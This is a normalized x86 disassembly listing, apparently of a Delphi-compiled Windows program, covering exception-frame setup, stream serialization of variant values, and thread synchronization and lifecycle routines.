mov [ fs : eax ] esp
lea ecx [ ebp - 0x8 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
call sub_4156fc
mov eax [ ebp + 0x8 ]
push eax
call sub_41fb10
pop ecx
mov ebx [ ebp - 0x8 ]
test ebx ebx
jne r-xdata
lea ecx [ ebp - 0x10c ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x1c ]
mov eax [ eax ]
mov edx ebx
call sub_40356c
lea edx [ ebp - 0x10c ]
lea eax [ ebp - 0xc ]
call sub_404310
mov edx [ ebp - 0xc ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_41f160
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov dl 0xd
call sub_420b6c
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42036e
lea eax [ ebp - 0xc ]
call sub_4040ac
retn
sub_420374
push ebp
mov ebp esp
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
xor eax eax
push ebp
push sub_4203cd
push [ fs : eax ]
mov [ fs : eax ] esp
lea ecx [ ebp - 0x10 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
call sub_41567c
mov eax [ ebp + 0x8 ]
push eax
call sub_41fb10
pop ecx
lea edx [ ebp - 0x10 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_420524
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4203d4
lea eax [ ebp - 0x10 ]
call sub_40f260
retn
sub_4203d8
push ebp
mov ebp esp
add esp 0xffffffec
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x10 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
push eax
push sub_420b80
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x10 ]
call sub_41f9a8
test al al
jne r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
mov eax [ eax ]
cmp [ eax ] 0x7
jne r-xdata
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x28 ]
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x18 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x20 ]
call sub_41f40c
mov [ ebp - 0x11 ] al
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
mov eax [ eax ]
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0xc ]
movzx eax [ eax ]
cmp eax 0x10
ja r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x10 ]
call sub_414e28
mov edx [ r-xdata ]
call sub_40343c
test al al
je r-xdata
jmp [ eax * 4 + jump_table_420496 ]
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x10 ]
call sub_414e28
test [ eax + 0x24 ] 0x4
je r-xdata
push ebp
call sub_41fd08
pop ecx
jmp r-xdata
push ebp
call sub_41fdc8
pop ecx
jmp r-xdata
push ebp
call sub_41fe44
pop ecx
jmp r-xdata
push ebp
call sub_41ffe4
pop ecx
jmp r-xdata
push ebp
call sub_4202cc
pop ecx
jmp r-xdata
push ebp
call sub_420374
pop ecx
jmp r-xdata
push ebp
call sub_41fe08
pop ecx
jmp r-xdata
push ebp
call sub_4201f0
pop ecx
sub_420524
push ebp
mov ebp esp
add esp 0xfffffec4
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x3c ] ecx
mov [ ebp - 0x38 ] ecx
mov [ ebp - 0x34 ] ecx
mov [ ebp - 0x30 ] ecx
mov [ ebp - 0x2c ] ecx
mov [ ebp - 0x1c ] ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_420900
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_414468
test al al
je r-xdata
mov eax ebx
call sub_414300
and ax 0xfff
movzx eax ax
cmp eax 0x7
jg r-xdata
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bb98
call sub_403a64
cmp eax 0x10
jge r-xdata
je r-xdata
add eax 0xfffffff0
sub eax 0x3
jb r-xdata
sub eax 0x8
je r-xdata
mov eax ebx
call sub_411554
add esp 0xfffffff8
fstp [ esp ]
fwait
mov eax [ ebp - 0x4 ]
call sub_41f13c
jmp r-xdata
cmp eax 0x6
ja r-xdata
mov eax ebx
call sub_40fc04
mov edx eax
mov eax [ ebp - 0x4 ]
call sub_41f224
jmp r-xdata
sub eax 0x2
jb r-xdata
lea eax [ ebp - 0x2c ]
mov edx ebx
call sub_412c8c
mov edx [ ebp - 0x2c ]
mov eax [ ebp - 0x4 ]
call sub_420ab8
jmp r-xdata
sub eax 0x3
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_420907
lea eax [ ebp - 0x3c ]
mov edx 0x2
call sub_4040d0
lea eax [ ebp - 0x34 ]
call sub_405944
lea eax [ ebp - 0x30 ]
call sub_4040ac
lea eax [ ebp - 0x2c ]
call sub_4047b8
lea eax [ ebp - 0x1c ]
call sub_405944
retn
xor eax eax
push ebp
push sub_4208a4
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x8 ]
mov ax [ ebx ]
call sub_414760
test al al
je r-xdata
jmp [ eax * 4 + jump_table_4205a2 ]
mov eax ebx
call sub_4106c8
mov [ ebp - 0x28 ] eax
mov [ ebp - 0x24 ] edx
push [ ebp - 0x24 ]
push [ ebp - 0x28 ]
mov eax [ ebp - 0x4 ]
call sub_41f298
jmp r-xdata
sub eax 0xeb
je r-xdata
mov eax ebx
call sub_41100c
test al al
je r-xdata
jmp r-xdata
lea eax [ ebp - 0x38 ]
mov edx ebx
call sub_412564
mov edx [ ebp - 0x38 ]
mov eax [ ebp - 0x4 ]
call sub_420a64
jmp r-xdata
lea eax [ ebp - 0x1c ]
call sub_405944
push eax
lea eax [ ebp - 0x34 ]
mov edx ebx
call sub_413264
mov eax [ ebp - 0x34 ]
mov edx r-xdata
pop ecx
call sub_40d574
test al al
jne r-xdata
mov dl 0xd
mov eax [ ebp - 0x4 ]
call sub_420b6c
jmp r-xdata
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_420b6c
jmp r-xdata
mov eax ebx
call sub_411554
add esp 0xfffffffc
fstp [ esp ]
fwait
mov eax [ ebp - 0x4 ]
call sub_41f0f4
jmp r-xdata
mov eax ebx
call sub_411554
add esp 0xfffffff4
fstp [ esp ]
fwait
mov eax [ ebp - 0x4 ]
call sub_41f0d0
jmp r-xdata
mov eax ebx
call sub_411eb0
add esp 0xfffffff8
fistp [ esp ]
fwait
mov eax [ ebp - 0x4 ]
call sub_41f118
jmp r-xdata
lea eax [ ebp - 0x30 ]
mov edx ebx
call sub_412564
mov edx [ ebp - 0x30 ]
mov eax [ ebp - 0x4 ]
call sub_420a64
jmp r-xdata
jmp r-xdata
mov dl 0x8
mov eax [ ebp - 0x4 ]
call sub_420b6c
jmp r-xdata
mov dl 0x9
mov eax [ ebp - 0x4 ]
call sub_420b6c
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
xor eax eax
mov [ ebp - 0x10 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403280
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_420893
push [ fs : eax ]
mov [ fs : eax ] esp
mov dl 0x1
mov eax [ r-xdata ]
call sub_403280
mov [ ebp - 0x10 ] eax
push 0x400
mov ecx [ ebp - 0xc ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_41b8e0
mov [ ebp - 0x14 ] eax
xor eax eax
push ebp
push sub_420839
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
mov ecx [ ebp - 0x10 ]
mov eax [ ebp - 0x1c ]
mov ebx [ eax ]
call [ ebx + 0x10 ]
mov eax [ ebp - 0x10 ]
mov edx [ eax ]
call [ edx ]
mov [ ebp - 0x18 ] eax
lea edx [ ebp - 0x13c ]
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
call sub_403200
lea edx [ ebp - 0x13c ]
lea eax [ ebp - 0x3c ]
call sub_404310
mov edx [ ebp - 0x3c ]
mov eax [ ebp - 0x14 ]
call sub_420a64
lea edx [ ebp - 0x18 ]
mov ecx 0x4
mov eax [ ebp - 0x14 ]
call sub_41e914
mov eax [ ebp - 0x10 ]
mov edx [ eax + 0x4 ]
mov ecx [ ebp - 0x18 ]
mov eax [ ebp - 0x14 ]
call sub_41e914
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_420840
mov eax [ ebp - 0x14 ]
call sub_4032b0
retn
sub_420840
mov eax [ ebp - 0xc ]
mov edx [ eax ]
call [ edx ]
mov [ ebp - 0x18 ] eax
mov dl 0xa
mov eax [ ebp - 0x4 ]
call sub_420b6c
lea edx [ ebp - 0x18 ]
mov ecx 0x4
mov eax [ ebp - 0x4 ]
call sub_41e914
mov eax [ ebp - 0xc ]
mov edx [ eax + 0x4 ]
mov ecx [ ebp - 0x18 ]
mov eax [ ebp - 0x4 ]
call sub_41e914
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x10 ]
call sub_4032b0
mov eax [ ebp - 0xc ]
call sub_4032b0
retn
sub_420920
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_420966
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
mov ecx esi
mov edx [ ebx + 0x2c ]
call sub_4043b8
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_420984
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42096d
lea eax [ ebp - 0x4 ]
call sub_4040ac
retn
sub_420984
push ebx
push esi
push ecx
mov esi edx
mov ebx eax
mov eax esi
call sub_40436c
mov [ esp ] eax
cmp [ esp ] 0xff
jle r-xdata
mov edx esp
mov ecx 0x1
mov eax ebx
call sub_41e914
mov eax esi
call sub_40456c
mov edx eax
mov ecx [ esp ]
mov eax ebx
call sub_41e914
pop edx
pop esi
pop ebx
retn
mov [ esp ] 0xff
sub_4209cc
push ebx
push esi
push edi
push ecx
mov edi ecx
mov esi edx
mov ebx eax
mov eax esi
mov edx edi
call sub_4044b8
je r-xdata
mov eax esi
call sub_40436c
mov [ esp ] eax
cmp [ esp ] 0xff
jg r-xdata
mov eax edi
call sub_40436c
mov [ esp ] eax
mov dl 0x14
mov eax ebx
call sub_420b6c
mov edx esp
mov ecx 0x4
mov eax ebx
call sub_41e914
mov edx edi
mov ecx [ esp ]
mov eax ebx
call sub_41e914
jmp r-xdata
mov dl 0xc
mov eax ebx
call sub_420b6c
mov edx esp
mov ecx 0x4
mov eax ebx
call sub_41e914
mov dl 0x6
mov eax ebx
call sub_420b6c
mov edx esp
mov ecx 0x1
mov eax ebx
call sub_41e914
jmp r-xdata
pop edx
pop edi
pop esi
pop ebx
retn
mov edx esi
mov ecx [ esp ]
mov eax ebx
call sub_41e914
sub_420a64
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_420aa9
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax esi
call sub_405db8
mov ecx [ ebp - 0x4 ]
mov edx esi
mov eax ebx
call sub_4209cc
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_420ab0
lea eax [ ebp - 0x4 ]
call sub_4040ac
retn
sub_420ab8
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push ebx
push esi
push edi
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_420b5e
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x8 ]
mov eax ebx
call sub_405c68
mov eax [ ebp - 0x8 ]
call sub_40436c
mov edi eax
mov eax ebx
call sub_404924
add eax eax
cmp edi eax
jge r-xdata
mov dl 0x12
mov eax esi
call sub_420b6c
mov eax ebx
call sub_404924
mov [ ebp - 0x4 ] eax
lea edx [ ebp - 0x4 ]
mov ecx 0x4
mov eax esi
call sub_41e914
mov ecx [ ebp - 0x4 ]
add ecx ecx
mov edx ebx
mov eax esi
call sub_41e914
lea eax [ ebp - 0xc ]
mov edx ebx
call sub_404334
mov edx [ ebp - 0xc ]
mov ecx [ ebp - 0x8 ]
mov eax esi
call sub_4209cc
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_420b65
lea eax [ ebp - 0xc ]
call sub_4040ac
lea eax [ ebp - 0x8 ]
call sub_4040ac
retn
sub_420b80
push ebp
mov ebp esp
push ebx
mov ebx [ eax + 0x20 ]
mov [ edx ] ebx
mov edx [ eax + 0x18 ]
mov [ ecx ] edx
mov edx [ ebp + 0xc ]
mov ecx [ eax + 0x1c ]
mov [ edx ] ecx
mov edx [ ebp + 0x8 ]
mov eax [ eax + 0x28 ]
mov [ edx ] eax
pop ebx
pop ebp
retn 0x8
sub_420c3c
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
mov ebx eax
call GetCurrentThreadId
mov edx [ rw-data ]
cmp eax [ edx ]
je r-xdata
test ebx ebx
jle r-xdata
call GetCurrentThreadId
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x10 ] 0x0
lea eax [ ebp - 0x14 ]
push eax
push 0x0
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bbd4
call sub_403a64
call sub_420bf0
mov eax ebx
call sub_420bfc
jmp r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp - 0xc ]
cmp [ eax + 0x8 ] 0x0
jg r-xdata
xor eax eax
mov [ ebp - 0xc ] eax
push rw-data
call EnterCriticalSection
xor eax eax
push ebp
push sub_420dca
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0xc ]
push eax
push rw-data
call InterlockedExchange
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_420dab
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp - 0xc ] 0x0
je r-xdata
mov [ ebp - 0x1 ] al
cmp [ ebp - 0x1 ] 0x0
je r-xdata
mov al 0x1
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_420db2
mov eax [ ebp - 0xc ]
call sub_4032b0
retn
jmp r-xdata
mov eax [ ebp - 0xc ]
cmp [ eax + 0x8 ] 0x0
jg r-xdata
xor edx edx
mov eax [ ebp - 0xc ]
call sub_4189b0
mov [ ebp - 0x8 ] eax
xor edx edx
mov eax [ ebp - 0xc ]
call sub_4188a0
push rw-data
call LeaveCriticalSection
xor eax eax
push ebp
push sub_420d75
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
push ebp
push sub_420d46
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
mov ebx [ eax ]
mov eax [ ebx + 0xc ]
call [ ebx + 0x8 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
push rw-data
call EnterCriticalSection
retn
sub_420ddc
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push r-xdata
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
cmp [ eax + 0xd ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov bl [ eax + 0xf ]
mov eax [ ebp - 0x4 ]
mov esi [ eax + 0x14 ]
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx ]
mov eax [ ebp - 0x4 ]
mov [ eax + 0x10 ] 0x1
call sub_420c18
test bl bl
je r-xdata
xor eax eax
push ebp
push sub_420e1d
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x4 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax esi
call sub_4040a4
mov eax [ ebp - 0x4 ]
call sub_4032b0
sub_420e22
call sub_4027bc
mov edx [ ebp - 0x4 ]
mov [ edx + 0x38 ] eax
call sub_403ae0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov bl [ eax + 0xf ]
mov eax [ ebp - 0x4 ]
mov esi [ eax + 0x14 ]
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx ]
mov eax [ ebp - 0x4 ]
mov [ eax + 0x10 ] 0x1
call sub_420c18
test bl bl
je r-xdata
mov eax esi
call sub_4040a4
mov eax [ ebp - 0x4 ]
call sub_4032b0
sub_420e84
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
xor ebx ebx
mov [ ebp - 0x10 ] ebx
test dl dl
je r-xdata
mov ebx ecx
mov [ ebp - 0x1 ] dl
mov esi eax
xor eax eax
push ebp
push sub_420f2e
push [ fs : eax ]
mov [ fs : eax ] esp
xor edx edx
mov eax esi
call sub_403280
call sub_420c24
mov [ esi + 0xe ] bl
mov [ esi + 0xc ] bl
push esi
push 0x4
lea eax [ esi + 0x8 ]
push eax
mov ecx sub_420ddc
xor edx edx
xor eax eax
call sub_404060
mov ebx eax
mov [ esi + 0x4 ] ebx
test ebx ebx
jne r-xdata
add esp 0xfffffff0
call sub_4035fc
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_420f35
lea eax [ ebp - 0x10 ]
call sub_4040ac
retn
call GetLastError
lea edx [ ebp - 0x10 ]
call sub_40b2d4
mov eax [ ebp - 0x10 ]
mov [ ebp - 0xc ] eax
mov [ ebp - 0x8 ] 0xb
lea eax [ ebp - 0xc ]
push eax
push 0x0
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bbd4
call sub_403a64
sub_420f54
push ebx
push esi
call sub_403664
mov ebx edx
mov esi eax
cmp [ esi + 0x8 ] 0x0
je r-xdata
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
cmp [ esi + 0x10 ] 0x0
jne r-xdata
mov edx ebx
and dl 0xfc
mov eax esi
call sub_4032a0
mov eax [ esi + 0x38 ]
call sub_4032b0
call sub_420c30
test bl bl
jle r-xdata
push eax
call CloseHandle
mov eax esi
call sub_4212c4
cmp [ esi + 0xc ] 0x0
je r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_40364c
mov eax esi
call sub_4212cc
mov eax esi
call sub_42129c
sub_420fc8
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
xor ecx ecx
mov [ ebp - 0x14 ] ecx
mov ebx edx
xor eax eax
push ebp
push sub_421036
push [ fs : eax ]
mov [ fs : eax ] esp
test ebx ebx
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42103d
lea eax [ ebp - 0x14 ]
call sub_4040ac
retn
lea edx [ ebp - 0x14 ]
mov eax ebx
call sub_40b2d4
mov eax [ ebp - 0x14 ]
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] 0xb
mov [ ebp - 0x8 ] ebx
mov [ ebp - 0x4 ] 0x0
lea eax [ ebp - 0x10 ]
push eax
push 0x1
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bbd4
call sub_403a64
sub_421084
push ebx
push esi
mov ebx edx
mov esi eax
xor eax eax
mov al bl
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ esi + 0x4 ]
push eax
call SetThreadPriority
cmp eax 0x1
sbb edx edx
inc edx
mov eax esi
call sub_421044
pop esi
pop ebx
retn
sub_4210b0
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
mov [ ebp - 0x4 ] edx
call GetCurrentThreadId
mov edx [ rw-data ]
cmp eax [ edx ]
jne r-xdata
push 0x0
push 0x0
push 0xffffffff
push 0x0
call CreateEventA
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_4211d2
push [ fs : eax ]
mov [ fs : eax ] esp
push rw-data
call EnterCriticalSection
xor eax eax
push ebp
push sub_4211b4
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ rw-data ] 0x0
jne r-xdata
mov ebx [ ebp - 0x4 ]
mov eax [ ebx + 0xc ]
call [ ebx + 0x8 ]
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov [ ebp - 0xc ] eax
lea edx [ ebp - 0xc ]
mov eax [ rw-data ]
call sub_418854
call sub_420c18
cmp [ rw-data ] 0x0
je r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_403280
mov [ rw-data ] eax
pop ebx
mov esp ebp
pop ebp
retn
push rw-data
call LeaveCriticalSection
xor eax eax
push ebp
push sub_421195
push [ fs : eax ]
mov [ fs : eax ] esp
push 0xffffffff
mov eax [ ebp - 0x8 ]
push eax
call WaitForSingleObject
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42119c
push rw-data
call EnterCriticalSection
retn
mov eax [ ebp - 0xc ]
mov edx [ eax ]
mov eax [ rw-data ]
call [ rw-data ]
sub_4211f0
push ebp
mov ebp esp
mov [ eax + 0x20 ] eax
xor edx edx
mov [ eax + 0x30 ] edx
mov edx [ ebp + 0x8 ]
mov [ eax + 0x28 ] edx
mov edx [ ebp + 0xc ]
mov [ eax + 0x2c ] edx
lea edx [ eax + 0x20 ]
mov eax [ eax ]
call sub_4210b0
pop ebp
retn 0x8
sub_421230
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov al [ eax + 0xe ]
mov [ ebp - 0x5 ] al
xor eax eax
push ebp
push sub_42127d
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov [ eax + 0xe ] 0x1
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
push eax
call SuspendThread
test eax eax
setge dl
mov eax [ ebp - 0x4 ]
call sub_421044
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_42129c
push ebx
push esi
mov ebx eax
mov eax [ ebx + 0x4 ]
push eax
call ResumeThread
mov esi eax
test esi esi
setge dl
mov eax ebx
call sub_421044
dec esi
jne r-xdata
pop esi
pop ebx
retn
mov [ ebx + 0xe ] 0x0
sub_4212cc
push ebx
push esi
add esp 0xffffffd8
mov esi eax
mov eax [ esi + 0x4 ]
mov [ esp + 0x4 ] eax
call GetCurrentThreadId
mov edx [ rw-data ]
cmp eax [ edx ]
jne r-xdata
push 0xffffffff
mov eax [ esp + 0x8 ]
push eax
call WaitForSingleObject
xor ebx ebx
mov eax [ rw-data ]
mov [ esp + 0x8 ] eax
push 0x40
push 0x3e8
push 0x0
lea eax [ esp + 0x10 ]
push eax
push 0x2
call MsgWaitForMultipleObjects
mov ebx eax
cmp ebx 0xffffffff
setne dl
mov eax esi
call sub_421044
cmp ebx 0x1
jne r-xdata
push 0x0
push 0x0
push 0x0
push 0x0
lea eax [ esp + 0x1c ]
push eax
call PeekMessageA
test ebx ebx
jne r-xdata
xor eax eax
call sub_420c3c
cmp ebx 0x2
jne r-xdata
jmp r-xdata
push esp
mov eax [ esp + 0x8 ]
push eax
call GetExitCodeThread
cmp eax 0x1
sbb edx edx
inc edx
mov eax esi
call sub_421044
mov eax [ esp ]
add esp 0x28
pop esi
pop ebx
retn
sub_421370
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
mov al [ r-xdata ]
mov [ edi + 0x24 ] al
test esi esi
je r-xdata
add esp 0xfffffff0
call sub_4035fc
mov eax edi
test bl bl
je r-xdata
mov edx edi
mov eax esi
call sub_421528
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_403654
pop [ fs : 0x0 ]
add esp 0xc
sub_4213bc
push ebx
push esi
push ecx
call sub_403664
mov [ esp ] dl
mov ebx eax
mov eax ebx
call sub_421610
cmp [ ebx + 0x14 ] 0x0
je r-xdata
mov eax ebx
call sub_4215b8
mov eax [ ebx + 0x4 ]
test eax eax
je r-xdata
jmp r-xdata
mov dl [ esp ]
and dl 0xfc
mov eax ebx
call sub_418f80
cmp [ esp ] 0x0
jle r-xdata
mov edx ebx
call sub_421580
mov esi [ ebx + 0x14 ]
test esi esi
je r-xdata
pop edx
pop esi
pop ebx
retn
mov eax ebx
call sub_40364c
lea eax [ ebx + 0x14 ]
call sub_40d564
cmp [ esi + 0x8 ] 0x0
jg r-xdata
mov edx [ esi + 0x8 ]
dec edx
mov eax esi
call sub_4189b0
mov cl 0x1
mov edx ebx
mov esi [ eax ]
call [ esi + 0x10 ]
sub_421440
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x4 ]
test eax eax
je r-xdata
cmp [ ebx + 0x14 ] 0x0
jne r-xdata
cmp eax [ esi + 0x4 ]
je r-xdata
mov edx esi
mov eax [ ebx + 0x14 ]
call sub_418a0c
test eax eax
jge r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_403280
mov [ ebx + 0x14 ] eax
or [ ebx + 0x1c ] 0x100
pop esi
pop ebx
retn
mov edx esi
mov eax [ ebx + 0x14 ]
call sub_418854
mov edx ebx
mov eax esi
call sub_421440
sub_4214d4
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x10 ] 0x0
jne r-xdata
mov edx esi
mov eax [ ebx + 0x10 ]
call sub_418854
mov [ esi + 0x4 ] ebx
pop esi
pop ebx
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_403280
mov [ ebx + 0x10 ] eax
sub_421500
push ebx
mov ebx eax
xor eax eax
mov [ edx + 0x4 ] eax
mov eax [ ebx + 0x10 ]
call sub_418b4c
mov eax [ ebx + 0x10 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
pop ebx
retn
call sub_4032b0
xor eax eax
mov [ ebx + 0x10 ] eax
sub_421528
push ebx
push esi
push edi
mov ebx edx
mov edi eax
mov edx edi
mov eax ebx
mov si 0xfff5
call sub_4034ac
mov eax [ ebx + 0x8 ]
push eax
xor ecx ecx
mov edx ebx
mov eax edi
mov esi [ eax ]
call [ esi + 0x20 ]
mov edx ebx
mov eax edi
call sub_4214d4
mov dl 0x1
mov eax ebx
call sub_421a48
test [ edi + 0x1c ] 0x10
je r-xdata
xor ecx ecx
mov edx ebx
mov eax edi
mov ebx [ eax ]
call [ ebx + 0x10 ]
pop edi
pop esi
pop ebx
retn
mov cl 0x1
mov dl 0x1
mov eax ebx
call sub_4219f8
sub_421580
push ebx
push esi
push edi
mov ebx edx
mov esi eax
push 0x0
mov ecx [ ebx + 0x8 ]
mov edx ebx
mov eax esi
mov edi [ eax ]
call [ edi + 0x20 ]
mov cl 0x1
mov edx ebx
mov eax esi
mov edi [ eax ]
call [ edi + 0x10 ]
xor edx edx
mov eax ebx
call sub_421a48
mov edx ebx
mov eax esi
call sub_421500
pop edi
pop esi
pop ebx
retn
sub_4215b8
push ebx
push esi
push edi
mov esi eax
jmp r-xdata
mov ebx [ esi + 0x10 ]
test ebx ebx
jne r-xdata
mov eax ebx
call sub_418a98
mov edi eax
test [ edi + 0x1d ] 0x1
jne r-xdata
pop edi
pop esi
pop ebx
retn
mov edx edi
mov eax esi
call sub_421580
jmp r-xdata
mov ax [ r-xdata ]
and ax [ esi + 0x1c ]
mov dx [ r-xdata ]
cmp dx ax
jne r-xdata
mov dl 0x1
mov eax edi
mov ecx [ eax ]
call [ ecx - 0x4 ]
mov edx edi
mov eax esi
call sub_421500
sub_421610
push ebx
push esi
push edi
mov ebx eax
test [ ebx + 0x1c ] 0x8
jne r-xdata
pop edi
pop esi
pop ebx
retn
or [ ebx + 0x1c ] 0x8
mov eax [ ebx + 0x10 ]
test eax eax
je r-xdata
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
inc esi
xor edi edi
mov edx edi
mov eax [ ebx + 0x10 ]
call sub_4189b0
call sub_421610
inc edi
dec esi
jne r-xdata
sub_42164c
push ebx
mov ebx eax
mov eax [ ebx + 0x14 ]
test eax eax
je r-xdata
pop ebx
retn
call sub_418b4c
mov eax [ ebx + 0x14 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
call sub_4032b0
xor eax eax
mov [ ebx + 0x14 ] eax
sub_421670
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_42164c
mov edx ebx
mov eax esi
call sub_42164c
pop esi
pop ebx
retn
sub_42168c
push ebx
push esi
push edi
push ebp
push ecx
mov [ esp ] cl
mov edi edx
mov esi eax
cmp [ esp ] 0x1
jne r-xdata
mov eax [ esi + 0x10 ]
test eax eax
je r-xdata
test edi edi
je r-xdata
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
mov edx edi
mov eax esi
call sub_421670
mov edx ebx
mov eax [ esi + 0x10 ]
call sub_4189b0
mov cl [ esp ]
